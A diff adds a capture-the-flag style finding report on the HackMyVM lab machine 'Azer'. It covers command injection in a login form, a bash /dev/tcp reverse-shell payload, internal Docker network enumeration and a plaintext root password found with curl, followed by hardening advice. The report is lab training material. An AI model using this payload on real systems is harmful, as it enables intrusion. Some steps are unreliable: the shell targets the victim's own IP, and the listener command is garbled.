@@ -1,0 +1,90 @@
+📑 Finding Report: User Access and Privilege Escalation
+Machine: Azer – HackMyVM
+
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was achieved through command injection in a web login form. Using a reverse shell, access was gained as a regular user. An internal Docker network was discovered, and by sending manual requests via curl, a plaintext root password was found in one of the internal IPs, leading to full system compromise and retrieval of the root flag.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+
+Machine: Azer (Linux – Easy)
+
+Assigned IP: 192.168.1.135
+
+Date of Analysis: 11/05/2025
+
+🛠 Tools Used
+nmap
+
+nc / nvlp
+
+Web browser
+
+bash
+
+curl
+
+Internal system enumeration (ip a, etc.)
+
+🔍 Finding Description
+4.1 Port Scanning
+nmap -sS -sV -oN azer_nmap.txt 192.168.1.135
+Port 80/tcp was identified running a web server with a login page.
+
+4.2 Command Injection in Login (Initial Access)
+Payload used:
+
+; bash -c "bash -i >& /dev/tcp/192.168.1.135/9999 0>&1";
+Listener on the attacker's machine:
+
+nvlp 9999
+Result: Limited user shell and access to user.txt.
+
+4.3 Internal Docker Network Discovery
+From the compromised system:
+
+ip a
+An internal Docker network was revealed in the 10.10.10.0/24 range.
+
+4.4 Internal Network Scanning
+From the attacker's machine:
+
+nmap -sP 10.10.10.0/24
+Multiple IPs were found, but no open ports were accessible.
+
+4.5 Manual Enumeration with curl
+From inside the compromised machine:
+
+curl 10.10.10.10
+Response:
+.:.AzerBulbul.:.
+This value was identified as the root password.
+
+4.6 Root Access
+su
+Password: AzerBulbul
+Root access was granted, and root.txt was retrieved.
+
+🔐 Impact
+Critical. This vulnerability enabled:
+
+Remote command execution without authentication
+
+Full root access from limited user
+
+Total system compromise
+
+🛡 Recommendations
+Properly validate and sanitize all input fields in web forms.
+
+Do not store sensitive credentials in internal services without protection.
+
+Use firewalls between containers and the host system.
+
+Restrict access to internal Docker networks.
+
+Apply hardening to publicly exposed web applications.
+
+Monitor outbound connections and access to unusual internal IPs.
